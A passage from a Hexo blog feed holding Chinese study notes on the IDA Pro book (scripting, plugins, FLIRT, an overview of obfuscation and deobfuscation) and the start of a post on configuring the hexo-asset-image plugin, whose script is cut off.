routine）中经常可以发现这类代码。<br>偏移量交叉引用表示的是引用的是某个位置的地址，并非内容。</p></blockquote></li><li><p>关于<strong>基本块</strong>：</p><blockquote><p>在计算机程序中，基本块是一条或数条指令的组合，它拥有唯一一个指向块起始位置的入口点和唯一一个指向块结束位置的退出点。<br>一般来说，除最后一条指令外，基本块中的每条指令都将控制权转交给它后面的“继任”指令。同样，除第一条指令外，基本块中的每条指令都从它“前任”指令那里接收控制权。<br>通常，为判定基本块，应忽略函数调用指令并未将控制权转交到当前函数这一事实，除非已知被调用的函数无法正常返回。基本块在行为方面有一个重要的特点，即一旦基本块中的第一条指令开始执行，块中的其他指令都会执行，直到最后一条指令。这个特点会对程序的运行时检测产生重大影响，因为这时不再需要为程序中的每一条指令设置一个断点，或者逐步执行程序，以记录程序执行的每一条指令。相反，你可以为每个基本块的第一条指令设置断点，当这些断点被触发时，相关块中的每一条指令都被标记为“已执行”。Pedram Amini 的PaiMei③框架中的Process Stalker 组件就是以这种方式执行的。</p></blockquote></li><li><p><code>F12</code>可以生成一个函数的外部流程图，不过很难看！<code>Ctrl+F12</code>可以生成整个二进制文件函数调用图，也很难看！</p></li><li><p>选定一个函数可以生成以其为源头或者目标的交叉引用图，View-&gt;Graphs-&gt;Xrefs from/to.</p></li><li><p>图形化的其他工具：</p><blockquote><p>自IDA 引入集成化反汇编图形模式后，这些困难有一部分得到了解决。但是，IDA 主要是一个反汇编器，生成图形并不是它的主要用途。对专用的图形分析工具感兴趣的读者可以研究专门用于此类目的的应用程序，如<code>BinNavi</code>，这款工具是Halvar Flake 的公司<code>Zynamics</code>开发的。</p></blockquote></li></ol><h5 id="第10章-IDA的多种面孔"><a href="#第10章-IDA的多种面孔" class="headerlink" title="第10章 IDA的多种面孔"></a>第10章 IDA的多种面孔</h5><p>介绍了IDA的控制台模式，在各种平台上的不同面孔，目前我只需关注Windows上的IDA控制台版本（idaw.exe），其实没什么好说的，书中的实际应用也还没有接触过。<br>另外还提了一下IDA的批量模式，批量模式是为了自动处理任务，这似乎和我后面打算做的插件有点关系，先在这儿提一下吧，有具体的参数说明。</p><blockquote><p>使用批量模式的主要目的是启动IDA，使它运行一段特定的IDC 脚本，并在该脚本完成后立即终止。</p></blockquote><h4 id="第三部分-IDA高级应用"><a href="#第三部分-IDA高级应用" class="headerlink" title="第三部分 IDA高级应用"></a>第三部分 IDA高级应用</h4><h5 id="第11章-定制IDA"><a href="#第11章-定制IDA" class="headerlink" title="第11章 定制IDA"></a>第11章 定制IDA</h5><p>ida目录下的cfg目录中的<code>ida.cfg, idagui.cfg, idatui.cfg</code>是IDA的设置文件，另外也可以新建一个<code>idauser.cfg</code>来重写其中的设置，这样便于在不同的ida中使用。<br>idagui.cfg是图形界面的配置，idatui.cfg是控制台模式的配置。</p><h5 id="第12章-使用FLIRT签名来识别库"><a href="#第12章-使用FLIRT签名来识别库" class="headerlink" title="第12章 使用FLIRT签名来识别库"></a>第12章 使用FLIRT签名来识别库</h5><p>FLIRT签名技术是用来识别可执行文件中的一些静态库的函数的，这样可以使逆向分析人员专注于程序本身的代码的分析。</p><ol><li><p>关于<code>Main</code>和<code>_start</code>:</p><blockquote><p>程序的入口点是即将执行的第一条指令的地址。因此，许多熟练的C 程序员错误地认为这就是main 函数的地址，但事实并非如此。程序的文件类型，而不是创建程序所使用的语言，决定了向这个程序提交命令行参数的方式。为了使加载器加载命令行参数的方式与程序预期接收参数的方式（例如，通过向main 提交参数）保持一致，程序必须在将控制权转交给main 之前执行一段初始化代码。IDA 将这段初始化代码作为程序的入口点，并将其标记为_start。<br>这段初始化代码还负责必须在main 运行之前完成的初始化任务。在C++程序中，这段代码负责确保在执行main 之前调用全局声明对象的构造函数。同样，为了在程序真正终止前调用所有全局对象的析构函数，必须插入在main 之后执行的清理代码（cleanup code）。</p></blockquote></li><li><p>如何生成签名文件：</p><blockquote><p>创建签名文件的基本过程听起来并不复杂，可以归结为4 个看似简单的步骤。<br>a. 获得一个你希望为其创建签名文件的静态库。<br>b. 利用其中一个FLAIR 解析器为该库创建一个模式文件。<br>c. 运行sigmake.exe 来处理生成的模式文件，并生成一个签名文件。<br>d. 将新的签名文件复制到<code>&lt;IDADIR&gt;/sig</code> 目录中，安装这个文件。</p></blockquote></li></ol><p>在之前的CTF经历中遇到过需要自己制作sig文件的题目，但是当时自己并没有仔细看，现在大概应该懂了。</p><h5 id="第13章-扩展IDA的知识"><a href="#第13章-扩展IDA的知识" class="headerlink" title="第13章 扩展IDA的知识"></a>第13章 扩展IDA的知识</h5><p>这一章主要是介绍til和ids的扩展功能，其主要作用就是让用户可以自定义设置自己的函数声明相关配置文件，这样在IDA自动分析的过程中就会识别出对应的函数的调用约定、参数类型、数量等。以后遇到具体的应用的时候可以再来重新仔细的看一遍。</p><ol><li>库函数中函数序号：<blockquote><p>序号是与每个导出函数有关的整数索引。使用序号可通过整数查询表迅速定位一个函数。若通过将函数名称与字符串进行比较来定位函数，则很缓慢。</p></blockquote></li><li>创建ids文件：<blockquote><p>IDA 的idsutils 实用工具用于创建.ids 文件。这些实用工具包括两个库解析器：从Windows DLL 中提取信息的dll2idt 和从ar 库中提取信息的ar2idt.exe。无论使用哪一个解析器，其输出都是一个.idt 文本文件，它每行显示一个导出函数，并将导出函数的序号与函数名称对应起来。</p></blockquote></li></ol><p><img src="/2019/10/23/IDA-Pro%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/20191102094833.png" alt="20191102094833"><br>3. 修改注释，使用loadint实用工具，后续需要花点时间来研究一下怎么创建一个ids文件和til文件。</p><h5 id="第14章-修补二进制文件及其他IDA的限制"><a href="#第14章-修补二进制文件及其他IDA的限制" class="headerlink" title="第14章 修补二进制文件及其他IDA的限制"></a>第14章 修补二进制文件及其他IDA的限制</h5><blockquote><p>IDA 并不是一个二进制文件编辑器。任何时候，如果你想要使用IDA 修补一个二进制文件，请记住这个事实。但是，它是一款特别有用的工具，可帮助你输入并显示潜在的更改。掌握IDA的全部功能，并结合IDA 通过适当的脚本或外部程序生成的信息，修补二进制文件也会变得简单可行。</p></blockquote><p>IDA 对二进制文件的修改这一方面感觉确实不行，如果要修改二进制文件，还是用专用的二进制编辑器吧，例如010 Editor、Winhex，扯一句，最近发现Winhex的功能真的挺强大的。</p><h4 id="第四部分-扩展IDA的功能"><a href="#第四部分-扩展IDA的功能" class="headerlink" title="第四部分 扩展IDA的功能"></a>第四部分 扩展IDA的功能</h4><h5 id="第15章-编写IDA脚本"><a href="#第15章-编写IDA脚本" class="headerlink" title="第15章  编写IDA脚本"></a>第15章  编写IDA脚本</h5><h6 id="IDC脚本的特性"><a href="#IDC脚本的特性" class="headerlink" title="IDC脚本的特性"></a>IDC脚本的特性</h6><p>IDC语言和C类似，但还是有很多区别的。</p><p>IDC使用关键字<code>auto</code>来声明一个局部变量，使用关键字<code>extern</code>来声明一个全局变量，但声明全局变量时不能为其提供初始值；</p><p>IDC并不支持C风格的数组，对于字符串这类的变量，支持和python一样的分片操作；</p><p>IDC并不严格限制变量的作用域，你可以在变量声明的花括号外面访问变量；</p><p>IDC中的<code>Message</code>函数类似于C中的<code>printf</code>函数；</p><p>IDC仅支持在独立的<code>.idc</code>文件中声明函数，<code>static</code>关键字用于声明用户自定义的函数，在IDC命令对话框中不能定义函数，因为这相当于在函数中定义函数，而IDC不支持嵌套声明；</p><p>IDC也支持类对象，但是不使用public、private类似的访问说明符，所有的成员都是有效公共类，且如果要在类中创建数据成员，只需要一个给类的数据成员的赋值语句就行；</p><p>IDC程序文件的基本结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt; //useful include directive</span></span></span><br><span class="line"><span class="comment">//declare addtional functions as required</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//do something fun here</span></span><br><span class="line">    AddHotkey(<span class="string">&quot;z&quot;</span>, <span class="string">&quot;func&quot;</span>); <span class="comment">//Now &#x27;z&#x27; invokes </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="IDC常用的函数"><a href="#IDC常用的函数" class="headerlink" title="IDC常用的函数"></a>IDC常用的函数</h6><ol><li><p>读取和修改数据的函数</p><p><code>long Byte(long addr)</code>，从虚拟地址addr 处读取一个字节值。</p><p><code>long Word(long addr)</code>，从虚拟地址addr 处读取一个字（2 字节）值。</p><p><code>long Dword(long addr)</code>，从虚拟地址addr 处读取一个双字（4 字节）值。</p><p><code>void PatchByte(long addr, long val)</code>，设置虚拟地址addr 处的一个字节值。</p><p><code>void PatchWord(long addr, long val)</code>，设置虚拟地址addr 处的一个字值。</p><p><code>void PatchDword(long addr, long val)</code>，设置虚拟地址addr 处的一个双字值。</p><p><code>bool isLoaded(long addr)</code>，如果addr 包含有效数据，则返回1，否则返回0。</p></li><li><p>用户交互函数</p><p><code>void Message(string format, ...)</code>，在输出窗口打印一条格式化消息。这个函数类似于C 语言的printf 函数，并接受printf 风格的格式化字符串。</p><p><code>void print(...)</code>，在输出窗口中打印每个参数的字符串表示形式。</p><p><code>void Warning(string format, ...)</code>，在对话框中显示一条格式化消息。</p><p><code>string AskStr(string default, string prompt)</code>，显示一个输入框，要求用户输入一个字符串值。如果操作成功，则返回用户的字符串；如果对话框被取消，则返回0。</p><p><code>string AskFile(long doSave, string mask, string prompt)</code>，显示一个文件选择对话框，以简化选择文件的任务。你可以创建新文件保存数据（doSave=1），或选择现有的文件读取数据（doSave=0）。你可以根据mask（如*.<em>或</em>.idc）过滤显示的文件列表。如果操作成功，则返回选定文件的名称；如果对话框被取消，则返回0。</p><p><code>long AskYN(long default, string prompt)</code>，用一个答案为“是”或“否”的问题提示用户，突出一个默认的答案（1 为是，0 为否，-1 为取消）。返回值是一个表示选定答案的整数。</p><p><code>long ScreenEA()</code>，返回当前光标所在位置的虚拟地址。</p><p><code>bool Jump(long addr)</code>，跳转到反汇编窗口的指定地址。</p></li><li><p>字符串操纵函数</p><ul><li><input disabled type="checkbox"> string form(string format, …)//preIDA5.6，返回一个新字符串，该字符串根据所提供的格式化字符串和值进行格式化。这个函数基本上等同于C 语言的sprintf 函数。</li><li><input disabled type="checkbox"> string sprintf(string format,…)//IDA5.6+，在IDA5.6 中，sprintf 用于替代form（参见上面）。</li><li><input disabled type="checkbox"> long atol(string val)，将十进制值val 转换成对应的整数值。</li><li><input disabled type="checkbox"> long xtol(string val)，将十六进制值val（可选择以0x 开头）转换成对应的整数值。</li><li><input disabled type="checkbox"> string ltoa(long val, long radix)，以指定的radix（2、8、10 或16）返回val 的字符串值。</li><li><input disabled type="checkbox"> long ord(string ch)，返回单字符字符串ch 的ASCII 值。</li><li><input disabled type="checkbox"> long strlen(string str)，返回所提供字符串的长度。</li><li><input disabled type="checkbox"> long strstr(string str, string substr)，返回str 中substr 的索引。如果没有发现子字符串，则返回-1。</li><li><input disabled type="checkbox"> string substr(string str, long start, long end)，返回包含str 中由start 到end-1位置的字符的子字符串。如果使用分片（ IDA5.6 及更高版本）， 此函数等同于str[start:end]。</li></ul></li><li><p>文件输入输出函数</p><ul><li><input disabled type="checkbox"> …这部分有点多了，单独写一篇出来吧，还有后面的IDAPython的相关函数，以便之后写插件的时候用到。</li></ul></li></ol><h6 id="IDAPython编写插件"><a href="#IDAPython编写插件" class="headerlink" title="IDAPython编写插件"></a>IDAPython编写插件</h6><ul><li>编写python脚本需要导入三个核心的模块：idaapi、idautils、idc。</li><li>需要定义一个plugin类作为插件的入口函数，参数idaapi.plugin_t是IDA的插件类，后续会讲到，例如：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classs PluginName_Plugin_t(idaapi.plugin_t):</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>然后需要注册plugin：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># register IDA plugin</span><br><span class="line">def PLUGIN_ENTRY():</span><br><span class="line">return PluginName_Plugin_t()</span><br></pre></td></tr></table></figure><h5 id="第16章-IDA软件开发工具包"><a href="#第16章-IDA软件开发工具包" class="headerlink" title="第16章 IDA软件开发工具包"></a>第16章 IDA软件开发工具包</h5><p>这一章讲的是IDA的SDK的使用方法，涉及到SDK的安装配置、应用编程接口，总的来说是让你如何系统的去使用IDC编写IDA的插件的这样一个体系结构。</p><p>有用的SDK数据类型：area_t, func_t, segment_t, idc_value_t, idainfo, struc_t, member_t, op_t, insn_t. 这些类型标明了IDA中的各个功能展现的数据形式，也就是可以通过编程将其进行操纵。</p><p>这一章也有一些常用的SDK函数，同上一章一样，我会单独将其列出来，方便以后查找，这一章的这些函数与IDC脚本相比，能够进行更加细化的控制。</p><h5 id="第17章-IDA插件体系结构"><a href="#第17章-IDA插件体系结构" class="headerlink" title="第17章 IDA插件体系结构"></a>第17章 IDA插件体系结构</h5><p>插件是经过编译的、功能更加强大的IDC脚本。</p><ol><li><p>插件的安装：我先挑最简单的来说，安装插件只需要将编译好的插件模块复制到<code>&lt;IDADIR&gt;/plugins</code>目录中即可，不过需要注意的是尽量在完全关闭IDA的情况下进行此操作，因为Windows系统不能覆写一个正在使用的插件，而在IDA打开的时候，你想要的覆写的插件可能设置了PLUGIN_FIX标志且证在运行。</p></li><li><p>编写插件：这里把插件上升为一个模块来解释，IDA模块都是以适用于执行插件的平台的共享库组件实现，而每个模块必须导出某个特定类的一个变量，对插件来说，就是plugin_t，这个类在SDK的loader.hpp文件中定义。【稍微查了一下：hpp = h + cpp, 先简单这么理解吧】<br>plugin_t类中的字段包括：version, flags, init, term, run, comment, help, wanted_name, wanted_hotkey.<br>以上的成员就涵盖了编写一个插件需要做的大致事务，根据名称能简单推断出各个字段的函数，其中term字段是一个函数指针，当插件卸载时，调用相关函数。【term即为terminate的缩写，好像我挺习惯这样记忆的】</p></li><li><p>构建插件：在Windows上，插件是有效的DLL文件（.plw/.p64），在Linux/Mac上，插件则是有效的共享文件对象（.plx/plx64, .pmc/pmc64）。构建插件需要简化版本的生成文件（makefile）和GNU工具，在Windows上使用MinGW。</p></li><li><p>可以在已编译的插件中扩展IDC，但现在还没有办法扩展IDAPython。</p></li><li><p>脚本化插件：创建Python插件的过程非常简单，只需要定义一个名为PLUGIN_ENTRY的函数，该函数返回plugin_t（在模块idaapi中定义）的一个实例。</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">idabook_plugin_t</span>(<span class="params">plugin_t</span>):</span></span><br><span class="line">flags = <span class="number">0</span></span><br><span class="line">wanted_name = <span class="string">&quot;IdaBook Python Plugin&quot;</span></span><br><span class="line">    wanted_hotkey = <span class="string">&quot;Alt-8&quot;</span></span><br><span class="line">      comment = <span class="string">&quot;IdaBook Python Plugin&quot;</span></span><br><span class="line">      <span class="built_in">help</span> = <span class="string">&quot;Something helpful&quot;</span></span><br><span class="line">      </span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">self</span>):</span></span><br><span class="line">          msg(<span class="string">&quot;IdaBook Python Plugin init called.\n&quot;</span>)</span><br><span class="line">          <span class="keyword">return</span> PLUGIN_OK</span><br><span class="line">      </span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">term</span>(<span class="params">self</span>):</span></span><br><span class="line">          msg(<span class="string">&quot;IdaBook Plugin term called.\n&quot;</span>)</span><br><span class="line">          </span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, arg</span>):</span></span><br><span class="line">          warning(<span class="string">&quot;IdaBook plugin run(%d) called&quot;</span> % arg)</span><br><span class="line">      </span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">PLUGIN_ENTRY</span>():</span></span><br><span class="line">          <span class="keyword">return</span> idabook_plugin_t()</span><br></pre></td></tr></table></figure></li></ol><p>上面是使用IDAPython写的一个小型插件，下面是使用IDC写的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">class <span class="title">idabook_plugin_t</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">idabook_plugin_t</span>()&#123;</span><br><span class="line"><span class="keyword">this</span>.flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">this</span>.wanted_name = <span class="string">&quot;IdaBook IDC Plugin&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.wanted_hotkey = <span class="string">&quot;Alt-9&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.comment = <span class="string">&quot;IdaBook IDC Plugin&quot;</span>;</span><br><span class="line"><span class="keyword">this</span>.help = <span class="string">&quot;Something helpful&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">init()&#123;</span><br><span class="line">Message(<span class="string">&quot;IdaBook plugin init called.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> PLUGIN_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">term()&#123;</span><br><span class="line">Message(<span class="string">&quot;IdaBook plugin term called.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">run(arg)&#123;</span><br><span class="line">Warning(<span class="string">&quot;IdaBook plugin run(%d) called.\n&quot;</span>, arg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">PLUGIN_ENTRY</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">idabook_plugin_t</span>();</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><h5 id="第18章-二进制文件与IDA加载器模块"><a href="#第18章-二进制文件与IDA加载器模块" class="headerlink" title="第18章 二进制文件与IDA加载器模块"></a>第18章 二进制文件与IDA加载器模块</h5><p>粗略看了一下，感觉未来一段时间暂时不会接触到，主要是讲如何去构建一个简单的加载器来识别未知的文件类型什么的，想到这，要是以后自己写出某个文件的IDA加载器放在github上，应该能体现我的编码能力吧。</p><h5 id="第19章-IDA处理器模块"><a href="#第19章-IDA处理器模块" class="headerlink" title="第19章 IDA处理器模块"></a>第19章 IDA处理器模块</h5><p>本章介绍IDA处理器模块的构建流程，是IDA模块化中最复杂的，我感觉比较硬核了，未来一段时间自己也不会接触吧，这也是我想买一本这个实体书的原因，万一后面有需要用到可以再来仔细看看。在本章中介绍的是针对Python的编译文件pyc的逆向处理器的构建过程，同上一章有类似之处。</p><h4 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h4><p>后面的这两部分打算略过看吧，有些技术深度确实现在看看不懂，就只细看我要去学习的相关章节吧。</p><h5 id="第20章-编译器变体"><a href="#第20章-编译器变体" class="headerlink" title="第20章 编译器变体"></a>第20章 编译器变体</h5><p>源代码相同，但是编译器不同，也就是构建选项不同所带来的二进制代码是截然不同的，这是因为编译器选择了不停的算法来实现各种高级结构。</p><p>这一章中提到了switch代码在Borland编译器和Visual C++下不同的的汇编代码结构，前者将跳转表嵌入进了函数当中，后者将跳转表放在邻近函数位置处，更好的区分了数据和代码，不会给程序的行为造成影响。</p><h5 id="第21章-模糊代码分析"><a href="#第21章-模糊代码分析" class="headerlink" title="第21章 模糊代码分析"></a>第21章 模糊代码分析</h5><p>模糊代码，反逆向分析。模糊是一种是某物变得模糊、混乱，令人困惑、迷惑，以防止他人理解被模糊的项目的行为。这一章介绍了主流的模糊代码技术，是我要阅读的重点。</p><h6 id="1-反静态分析技巧"><a href="#1-反静态分析技巧" class="headerlink" title="1.反静态分析技巧"></a>1.反静态分析技巧</h6><ul><li>call/jmp loc_XXXX + 1:形如这样的汇编代码，执行了一次调用，调用对象就在下一个指令的中间，由于IDA认为这个函数会返回，则继续反汇编接着的地址，然后真正的被调用指令却没有被反汇编。</li><li>xor eax, eax  jz loc_XXXX ：这两句汇编等于无条件跳转jmp，其与loc_XXXX之间的代码从未执行，仅起到迷惑分析人员的作用。</li></ul><p><strong>a. 动态计算目标地址</strong></p><p>这里的动态计算指的是接下来的执行地址在运行时计算得出。</p><ul><li>通过操作寄存器运算，得到真正的执行地址，然后将其赋值给栈顶处，再执行返回执行，就能跳转到执行地址，也就是（push，ret）结合的一种形式，在之前练习pwn的入门题目时遇到过。</li><li>通过FS段存放的异常函数指针链表，设置异常，调用异常处理函数，根据操作系统提供的CONTEXT结构体的参数信息恢复程序执行流程。</li><li>加壳处理，UPX，ASPack，ASProtect，tElock，Burneye，Shiva，VMProtect。</li></ul><p><strong>b. 导入的函数模糊</strong></p><p>这类技巧可以令dumpbin，ldd，objdump等工具失效，无法列出库依赖关系。</p><ul><li><p>使用Loadlibrary和GetProcAddress动态获取函数地址，使用函数。</p></li><li><p>由于每一个Windows程序都会加载kernel32.dll，而上一种方法中的两个函数都处于这个dll中，所以可以通过获取kernel32.dll的导入表，查找相关函数，对比hash值，定位具体的函数入口地址，实现函数功能。【这里参见Skape<a href="http://www.hick.org/code/skape/papers/win32-shellcode.pdf">的论文</a>“Understanding Windows Shellcode”，这个方法也是在之前我遇到的一个样本中出现的方法，现在看起来真是醍醐灌顶啊。】</p></li></ul><h6 id="2-反动态分析技巧"><a href="#2-反动态分析技巧" class="headerlink" title="2.反动态分析技巧"></a>2.反动态分析技巧</h6><p>这部分同反调试的技术差不多，检测虚拟化、检测调试器、反调试标志的设置，此处略过。</p><h6 id="3-使用IDA对二进制文件进行“静态去模糊”"><a href="#3-使用IDA对二进制文件进行“静态去模糊”" class="headerlink" title="3. 使用IDA对二进制文件进行“静态去模糊”"></a>3. 使用IDA对二进制文件进行“静态去模糊”</h6><p><strong>面向脚本的去模糊</strong></p><p>基于脚本的去模糊方案无法构建“万能式”的解决方案，现有包装器的任何细微变化都会使得脚本失效。脚本的针对性比较强。【这也导致我突然意识到我做的毕设似乎没有那么简单】</p><p><strong>面向模拟的去模糊</strong></p><p>基于模拟执行来实现去模糊，介绍了一个ida的插件<code>x86emu</code>，作为一个IDA的嵌入式x86指令的模拟器，后续对我的帮助也该会挺大的吧。</p><p><strong>基于虚拟机的模糊</strong></p><p>这主要是说VMProtect，感觉到达自己的知识瓶颈，我已经完全无法理解了。</p><blockquote><p>当前，恶意软件大多是模糊程序。因此，如果你希望研究一个恶意软件样本的内部运行机制，几乎可以肯定，你需要完成某种类型的去模糊任务。无论你是采用调试器辅助的动态去模糊方法，还是不想运行可能恶意的代码，而选择使用脚本或模拟对二进制文件进行去模糊处理，你的最终目标都是生成一个可以被完全反汇编、正确分析的去模糊二进制文件。多数情况下，最后的分析都要由IDA 之类的工具来完成。鉴于此（即使用IDA 进行分析），尝试从头至尾使用IDA 似乎有一定的道理。</p></blockquote><hr><p>注：暂时写到这儿吧，后面的部分我感觉我看了收获也不是太多吧，以后接触到再来看吧，觉得入手一本实体书，闲来无事翻一翻！</p>]]></content>
      
      
      <categories>
          
          <category> Read Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片测试</title>
      <link href="2019/10/18/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/"/>
      <url>2019/10/18/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h3 id="设置-config-yml"><a href="#设置-config-yml" class="headerlink" title="设置_config.yml"></a>设置<code>_config.yml</code></h3><p>将<code>post_asset_folder</code>设置为<code>true</code>.</p><p><img src="/2019/10/18/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/config.png" alt="config"></p><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p><code>npm install hexo-asset-image --save</code></p><p><img src="/2019/10/18/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/1571383044609.png" alt="1571383044609"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>新建文章，添加图片到对应的文件夹下，使用<code>markdown</code>格式添加图片到文章中：</p><p><img src="/2019/10/18/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/1571383180135.png" alt="1571383180135"></p><h3 id="图片URL问题"><a href="#图片URL问题" class="headerlink" title="图片URL问题"></a>图片URL问题</h3><p>在文章中的图片链接为相对路径，即<code>Title/pic.jpg</code>类似的，但是插件的脚本文件有点问题，在CSDN上找到了一位大佬修改后的脚本，贴在下面：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> cheerio = <span class="built_in">require</span>(<span class="string">&#x27;cheerio&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPosition</span>(<span class="params">str, m, i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str.split(m, i).join(m).length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> version = <span class="built_in">String</span>(hexo.version).split(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">hexo.extend.filter.register(<span class="string">&#x27;after_post_render&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = hexo.config;</span><br><span class="line">  <span class="function"><span class="title">if</span>(<span class="params">config.post_asset_folder</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> link = data.permalink;</span><br><span class="line"><span class="keyword">if</span>(version.length &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">Number</span>(version[<span class="number">0</span>]) == <span class="number">3</span>)</span><br><span class="line">   <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="keyword">var</span> beginPos = getPosition(link, <span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">// In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.</span></span><br><span class="line"><span class="keyword">var</span> endPos = link.lastIndexOf(<span class="string">&#x27;/&#x27;</span>) + <span class="number">1</span>;</span><br><span class="line">    link = link.substring(beginPos, endPos);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toprocess = [<span class="string">&#x27;excerpt&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="function"><span 